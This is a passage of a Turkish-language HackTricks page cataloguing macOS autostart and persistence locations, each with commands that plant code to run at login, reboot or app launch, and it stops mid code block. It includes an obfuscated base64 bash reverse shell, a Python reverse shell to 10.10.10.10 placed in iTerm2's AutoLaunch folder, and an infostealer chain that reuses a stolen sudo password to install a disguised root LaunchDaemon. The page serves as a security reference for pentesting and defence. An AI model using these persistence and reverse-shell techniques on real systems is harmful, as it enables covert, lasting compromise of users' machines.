# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Bu bölüm büyük ölçüde [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisine dayanmaktadır. Amaç, **daha fazla Autostart Location** eklemek (mümkünse), macOS'un en son sürümünde (13.4) **hangi tekniklerin hâlâ çalıştığını** belirtmek ve gereken **izinleri** açıklamaktır.

## Sandbox Bypass

> [!TIP]
> Burada, **root izinlerine** ihtiyaç duymadan **bir dosyaya yazarak** ve çok **yaygın** bir **eylemi**, belirli bir **süreyi** veya sandbox içinden genellikle gerçekleştirebileceğiniz bir **eylemi** bekleyerek bir şeyi basitçe çalıştırmanıza olanak tanıyan **sandbox bypass** için yararlı başlangıç konumlarını bulabilirsiniz.

### Launchd

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> İlginç bir bilgi olarak, **`launchd`**, Mach-o bölümündeki `__Text.__config` içinde, launchd'nin başlatması gereken diğer iyi bilinen servisleri içeren gömülü bir property list'e sahiptir. Ayrıca bu servisler, çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelen `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` değerlerini içerebilir.
>
> Elbette code signing nedeniyle değiştirilemez.

#### Description & Exploitation

**`launchd`**, başlangıçta OX S kernel tarafından çalıştırılan **ilk** **process** ve kapanış sırasında tamamlanan son process'tir. Her zaman **PID 1** olmalıdır. Bu process, aşağıdaki konumlarda bulunan **ASEP** **plist** dosyalarında belirtilen yapılandırmaları **okur ve çalıştırır**:

- `/Library/LaunchAgents`: Admin tarafından yüklenen kullanıcı başına agents
- `/Library/LaunchDaemons`: Admin tarafından yüklenen sistem genelindeki daemons
- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına agents.
- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki daemons.

Bir kullanıcı giriş yaptığında, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumlarında bulunan plist dosyaları **oturum açan kullanıcının izinleriyle** başlatılır.

**Agents ve daemons arasındaki temel fark, agents'ın kullanıcı giriş yaptığında, daemons'ın ise sistem başlangıcında yüklenmesidir** (çünkü ssh gibi bazı servislerin herhangi bir kullanıcının sisteme erişmesinden önce çalıştırılması gerekir). Ayrıca agents GUI kullanabilirken daemons arka planda çalışmalıdır.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Bazı durumlarda bir **Agent'in kullanıcı giriş yapmadan önce çalıştırılması gerekir**; bunlara **PreLoginAgents** adı verilir. Örneğin bu, giriş sırasında assistive technology sağlamak için kullanışlıdır. Bunlar ayrıca `/Library/LaunchAgents` konumunda da bulunabilir (bir örnek için [**buraya**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bakın).

> [!TIP]
> Yeni Daemon veya Agent config dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` **kullanılarak yüklenecektir**. `.plist` uzantısı olmayan dosyaları `launchctl -F <file>` ile yüklemek de **mümkündür** (ancak bu plist dosyaları yeniden başlatmadan sonra otomatik olarak yüklenmez).\
> `launchctl unload <target.plist>` ile **unload** etmek de **mümkündür** (bu dosyanın işaret ettiği process sonlandırılır).
>
> Bir **Agent** veya **Daemon'ın** **çalışmasını** engelleyen **herhangi bir şey** (örneğin bir override) olmadığından **emin olmak** için şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Mevcut user tarafından yüklenen tüm Agent ve Daemon'ları listeleyin:
```bash
launchctl list
```
#### Örnek kötü amaçlı LaunchDaemon zinciri (password reuse)

Yakın zamanda görülen bir macOS infostealer, bir **ele geçirilmiş sudo parolasını** kullanarak bir user agent ve root LaunchDaemon yerleştirdi:<sup>[[1]](#references)</sup>

- Agent döngüsünü `~/.agent` konumuna yazın ve çalıştırılabilir hale getirin.
- Bu agent'ı işaret eden bir plist'i `/tmp/starter` konumunda oluşturun.
- Çalınan parolayı `sudo -S` ile yeniden kullanarak dosyayı `/Library/LaunchDaemons/com.finder.helper.plist` konumuna kopyalayın, `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
- Çıktıyı ayırmak için agent'ı `nohup ~/.agent >/dev/null 2>&1 &` ile sessizce başlatın.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Bir plist bir kullanıcıya aitse, daemon sistem genelindeki klasörlerde bulunsa bile **task kullanıcı olarak** ve root olarak değil **çalıştırılır**. Bu durum bazı privilege escalation saldırılarını engelleyebilir.

#### launchd hakkında daha fazla bilgi

**`launchd`**, **kernel** tarafından başlatılan **ilk user mode process**'tir. Process başlangıcı **başarılı olmalı** ve process **sonlanamaz veya crash olamaz**. Hatta bazı **killing signal**'larına karşı **korumalıdır**.

`launchd`'nin yapacağı ilk şeylerden biri, aşağıdakiler gibi tüm **daemon**'ları **başlatmaktır**:

- Çalıştırılma zamanına dayalı **Timer daemon**'ları:
- atd (`com.apple.atrun.plist`): 30 dakikalık bir `StartInterval` değerine sahiptir
- crond (`com.apple.systemstats.daily.plist`): 00:15'te başlamak için `StartCalendarInterval` değerine sahiptir
- **Network daemon**'ları:
- `org.cups.cups-lpd`: TCP'yi (`SockType: stream`) `printer` adlı `SockServiceName` ile dinler
- SockServiceName bir port veya `/etc/services` içindeki bir service olmalıdır
- `com.apple.xscertd.plist`: TCP üzerinde 1640 portunu dinler
- Belirtilen bir path değiştiğinde çalıştırılan **Path daemon**'ları:
- `com.apple.postfix.master`: `/etc/postfix/aliases` path'ini kontrol eder
- **IOKit notification daemon**'ları:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` entry'sinde `com.apple.xscertd.helper` adını belirtir
- **UserEventAgent:**
- Bu, önceki örnekten farklıdır. Belirli bir event'e yanıt olarak launchd'nin app'leri spawn etmesini sağlar. Ancak bu durumda ilgili ana binary `launchd` değil, `/usr/libexec/UserEventAgent`'tır. SIP tarafından kısıtlanan /System/Library/UserEventPlugins/ folder'ından plugin'leri yükler; her plugin initializer'ını `XPCEventModuleInitializer` key'inde veya eski plugin'lerde, kendi `Info.plist` dosyasındaki `CFPluginFactories` dict'inin `FB86416D-6164-2070-726F-70735C216EC0` key'i altında belirtir.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ancak bu dosyaları yükleyen bir shell çalıştıran, TCC bypass özelliğine sahip bir app bulmanız gerekir

#### Konumlar

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zsh ile bir terminal açma
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zsh ile bir terminal açma
- Root gerekir
- **`~/.zlogout`**
- **Trigger**: zsh ile bir terminalden çıkma
- **`/etc/zlogout`**
- **Trigger**: zsh ile bir terminalden çıkma
- Root gerekir
- Muhtemelen daha fazlası: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bash ile bir terminal açma
- `/etc/profile` (çalışmadı)
- `~/.profile` (çalışmadı)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm ile tetiklenmesi beklenir, ancak **kurulu değildir** ve kurulduktan sonra bile şu hata alınır: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Açıklama ve Exploitation

`zsh` veya `bash` gibi bir shell environment başlatılırken **belirli startup file'ları çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanır. Terminal application başlatıldığında veya bir device SSH üzerinden erişildiğinde bu shell'e otomatik olarak erişilir. `bash` ve `sh` macOS'ta mevcut olsa da kullanılmaları için açıkça invoke edilmeleri gerekir.<sup>[[2]](#references)</sup>

`man zsh` ile okuyabileceğimiz zsh man page'i startup file'ları hakkında uzun bir açıklama içerir.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Yeniden Açılan Uygulamalar

> [!CAUTION]
> Belirtilen exploitation yöntemini yapılandırmak, oturumu kapatıp yeniden açmak veya sistemi yeniden başlatmak uygulamayı çalıştırmam için işe yaramadı. (Uygulama çalıştırılmıyordu; belki de bu işlemler gerçekleştirilirken çalışıyor olması gerekiyordur.)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Tetikleyici**: Yeniden başlatma sırasında uygulamaların yeniden açılması

#### Açıklama ve Exploitation

Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasının içindedir<sup>[[4]](#references)</sup>

Bu nedenle, yeniden açılan uygulamaların kendi uygulamanızı başlatmasını sağlamak için **uygulamanızı listeye eklemeniz** yeterlidir.

UUID, bu dizin listelenerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutuyla bulunabilir.

Yeniden açılacak uygulamaları kontrol etmek için şunu çalıştırabilirsiniz:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Bu listeye **bir uygulama eklemek** için şunu kullanabilirsiniz:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal, onu kullanan kullanıcının FDA permissions'larına sahip olacak şekilde kullanılabilir

#### Konum

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Tetikleyici**: Terminal'i açmak

#### Açıklama ve Exploitation

**`~/Library/Preferences`** içinde, Applications'da kullanıcıya ait preferences saklanır. Bu preferences'lardan bazıları, **diğer applications/scripts'leri çalıştırmak** için bir yapılandırma içerebilir.<sup>[[5]](#references)</sup>

Örneğin Terminal, Startup sırasında bir komut çalıştırabilir:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Bu yapılandırma, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasına şu şekilde yansır:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Yani, sistemdeki terminal tercihlerinin plist dosyasının üzerine yazılabilirse, **`open`** işlevi **terminali açmak ve bu komutun çalıştırılmasını sağlamak** için kullanılabilir.

Bunu CLI üzerinden şu şekilde ekleyebilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Diğer dosya uzantıları

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Kullanıcının FDA izinlerine sahip olmak için Terminal kullanımı

#### Konum

- **Herhangi bir yer**
- **Tetikleyici**: Terminal'i aç

#### Açıklama ve Exploitation

Bir [**`.terminal`** script'i](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturup açarsanız, **Terminal application** otomatik olarak çağrılır ve içindeki belirtilen komutları çalıştırır. Terminal app'in bazı özel ayrıcalıkları (TCC gibi) varsa komutunuz bu özel ayrıcalıklarla çalıştırılır.

Şununla deneyin:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Ayrıca normal shell script içerikleriyle **`.command`**, **`.tool`** uzantılarını da kullanabilirsiniz; bunlar da Terminal tarafından açılır.

> [!CAUTION]
> Terminal'de **Full Disk Access** varsa bu işlemi tamamlayabilir (gerçekleştirilen command'in bir Terminal penceresinde görünür olacağını unutmayın).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ek TCC erişimi elde edebilirsiniz

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Root gerekli
- **Trigger**: coreaudiod'ı veya bilgisayarı yeniden başlatın
- **`/Library/Audio/Plug-ins/Components`**
- Root gerekli
- **Trigger**: coreaudiod'ı veya bilgisayarı yeniden başlatın
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod'ı veya bilgisayarı yeniden başlatın
- **`/System/Library/Components`**
- Root gerekli
- **Trigger**: coreaudiod'ı veya bilgisayarı yeniden başlatın

#### Description

Önceki writeup'lara göre bazı **audio plugin'lerini derlemek** ve yüklenmelerini sağlamak mümkündür.<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ek TCC erişimi elde edebilirsiniz

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugin'leri, bir dosyanın **önizlemesini tetiklediğinizde** (Finder'da dosya seçiliyken space bar'a bastığınızda) ve bu dosya türünü **destekleyen bir plugin** yüklü olduğunda çalıştırılabilir.<sup>[[8]](#references)</sup>

Kendi QuickLook plugin'inizi derleyip yüklenmesi için önceki konumlardan birine yerleştirebilir, ardından desteklenen bir dosyaya gidip tetiklemek için space tuşuna basabilirsiniz.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Bu bende, ne user LoginHook ile ne de root LogoutHook ile çalıştı.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` gibi bir şeyi execute edebilmeniz gerekir
- `~/Library/Preferences/com.apple.loginwindow.plist` konumunda bulunur

Deprecated durumdadırlar, ancak bir user login yaptığında command execute etmek için kullanılabilirler.<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` içinde saklanır.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Silmek için:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Root kullanıcıya ait olan şu konumda saklanır: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Burada, bir şeyi **bir dosyaya yazarak** çalıştırmanıza ve belirli **programların kurulu olması**, "yaygın olmayan" kullanıcı eylemleri veya ortamlar gibi **çok yaygın olmayan koşulları** beklemenize olanak tanıyan **sandbox bypass** için kullanışlı start location konumlarını bulabilirsiniz.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak `crontab` binary'sini çalıştırabiliyor olmanız gerekir
- Veya root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Doğrudan yazma erişimi için root gerekir. `crontab <file>` çalıştırabiliyorsanız root gerekmez
- **Trigger**: Cron job'a bağlıdır

#### Description & Exploitation

**Mevcut kullanıcının** cron job'larını şu komutla listeleyin:
```bash
crontab -l
```
Ayrıca kullanıcıların tüm cron job'larını **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** içinde görebilirsiniz (root gerekir).

MacOS'ta **belirli sıklıkta** script çalıştıran çeşitli klasörler şuralarda bulunabilir:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Burada düzenli **cron** **jobs**, **at** **jobs** (pek kullanılmaz) ve **periodic** **jobs** (çoğunlukla geçici dosyaları temizlemek için kullanılır) bulunur. Günlük periodic jobs, örneğin `periodic daily` ile çalıştırılabilir.<sup>[[10]](#references)</sup>

**user cronjob** eklemek için programatik olarak şu kullanılabilir:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 daha önce verilmiş TCC izinlerine sahipti

#### Konumlar

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Tetikleyici**: iTerm'i aç
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Tetikleyici**: iTerm'i aç
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Tetikleyici**: iTerm'i aç

#### Açıklama ve Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** konumunda depolanan script'ler çalıştırılır. Örneğin:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
veya:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** betiği de çalıştırılacaktır:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** konumunda bulunan iTerm2 preferences, iTerm2 terminali açıldığında **çalıştırılacak bir komut belirtebilir**.

Bu ayar iTerm2 settings bölümünden yapılandırılabilir:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Komut preferences içinde şu şekilde görünür:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Çalıştırılacak komutu şu şekilde ayarlayabilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**'ı abuse ederek arbitrary komutlar çalıştırmanın **başka yolları** olma olasılığı oldukça yüksek.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak xbar'ın kurulu olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility permissions ister

#### Konum

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Tetikleyici**: xbar çalıştırıldığında

#### Açıklama

Popüler program [**xbar**](https://github.com/matryer/xbar) kuruluysa, xbar başlatıldığında çalıştırılacak bir shell script'i **`~/Library/Application\ Support/xbar/plugins/`** içine yazmak mümkündür:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Hammerspoon'un kurulu olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility izinleri ister

#### Konum

- **`~/.hammerspoon/init.lua`**
- **Tetikleyici**: hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA scripting language** kullanan bir **macOS** automation platformudur. Özellikle, tam AppleScript kodunun entegre edilmesini ve shell script'lerinin çalıştırılmasını destekleyerek scripting yeteneklerini önemli ölçüde geliştirir.<sup>[[13]](#references)</sup>

Uygulama tek bir dosyayı, `~/.hammerspoon/init.lua` dosyasını arar ve başlatıldığında script çalıştırılır.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak BetterTouchTool kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts ve Accessibility izinlerini ister

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Bu tool, bazı kısayollara basıldığında çalıştırılacak uygulamaları veya script'leri belirtmeye olanak tanır. Bir attacker, **database içinde kendi kısayolunu ve çalıştırılacak action'ı yapılandırarak** arbitrary code çalıştırılmasını sağlayabilir (bir kısayol yalnızca bir tuşa basmak olabilir).

### Alfred

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Alfred kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation, Accessibility ve hatta Full-Disk access izinlerini ister

#### Location

- `???`

Belirli koşullar karşılandığında code çalıştırabilen workflow'lar oluşturmaya olanak tanır. Bir attacker'ın bir workflow file oluşturup Alfred'in bunu yüklemesini sağlaması potansiyel olarak mümkündür (workflow'ları kullanmak için premium version satın almak gerekir).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak ssh etkinleştirilmiş ve kullanılıyor olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH, FDA access'e sahip olur

#### Location

- **`~/.ssh/rc`**
- **Trigger**: ssh ile Login
- **`/etc/ssh/sshrc`**
- Root gerekir
- **Trigger**: ssh ile Login

> [!CAUTION]
> ssh'i açmak için Full Disk Access gerekir:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Varsayılan olarak, `/etc/ssh/sshd_config` içinde `PermitUserRC no` bulunmadığı sürece, bir kullanıcı **SSH üzerinden Login yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** script'leri çalıştırılır.<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak `osascript`'i args ile çalıştırmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- `osascript` çağrılarak saklanan exploit payload
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root gerekir

#### Description

System Preferences -> Users & Groups -> **Login Items** bölümünde **kullanıcı Login yaptığında çalıştırılacak item'ları** bulabilirsiniz.\
Bunları command line üzerinden listelemek, eklemek ve kaldırmak mümkündür:<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
